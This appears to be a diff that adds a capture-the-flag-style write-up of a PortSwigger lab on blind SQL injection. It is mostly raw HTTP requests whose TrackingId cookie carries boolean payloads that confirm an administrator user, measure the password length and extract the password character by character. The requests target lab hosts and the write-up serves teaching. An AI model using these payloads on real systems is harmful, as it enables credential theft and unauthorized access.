@@ -1,0 +1,115 @@
+From lab discription: 
+The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows. 
+
+If we try to make error in the request we don't find "Welcome back" message in the response 
+```
+GET / HTTP/2
+Host: 0a4b000704dcf3b381bf125300c2004f.web-security-academy.net
+Cookie: TrackingId=UflmVV9SGLLAlATi'; session=htrFDNJ6CbabtXxIOB2S3lWw2a7x56oE
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Te: trailers
+```
+
+Try a boolean conditon 
+```
+GET / HTTP/2
+Host: 0a7400d204db15ea82f6fc7c006700a1.web-security-academy.net
+Cookie: TrackingId=BSc3ZXdz048MpBJK' and 1=1; session=d9a7fkx1JN29roD1gDt5pU85QgeVlh8o
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Te: trailers
+```
+
+From discription we know that we have table called `users`
+Try to check on it with condins 
+```
+GET / HTTP/2
+Host: 0a7400d204db15ea82f6fc7c006700a1.web-security-academy.net
+Cookie: TrackingId=BSc3ZXdz048MpBJK' and (SELECT 'a' from users LIMIT 1)='a; session=d9a7fkx1JN29roD1gDt5pU85QgeVlh8o
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Te: trailers
+```
+
+Check for `administrator` user
+```
+GET / HTTP/2
+Host: 0a4b000704dcf3b381bf125300c2004f.web-security-academy.net
+Cookie: TrackingId=UflmVV9SGLLAlATi' and (SELECT 'a' from users WHERE username='administrator')='a; session=htrFDNJ6CbabtXxIOB2S3lWw2a7x56oE
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Te: trailers
+```
+
+We found the user then check for the length of the user password
+```
+GET / HTTP/2
+Host: 0a4b000704dcf3b381bf125300c2004f.web-security-academy.net
+Cookie: TrackingId=UflmVV9SGLLAlATi' and (SELECT 'a' from users WHERE username='administrator' and LENGTH(password)=20)='a; session=htrFDNJ6CbabtXxIOB2S3lWw2a7x56oE
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Te: trailers
+```
+With `Welcome back` message so we found the length = `20`
+
+Use `SUBSTRING` function to enumerate the password
+```
+GET / HTTP/2
+Host: 0a4b000704dcf3b381bf125300c2004f.web-security-academy.net
+Cookie: TrackingId=UflmVV9SGLLAlATi' and (SELECT SUBSTRING(password,1,1) from users WHERE username='administrator')='a; session=htrFDNJ6CbabtXxIOB2S3lWw2a7x56oE
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Te: trailers
+```
+Use the python code `brute.py` to get the full password
+Don't forget to change the `'TrackingId` and `session` variables 
+Then login with the adminstrator user!!
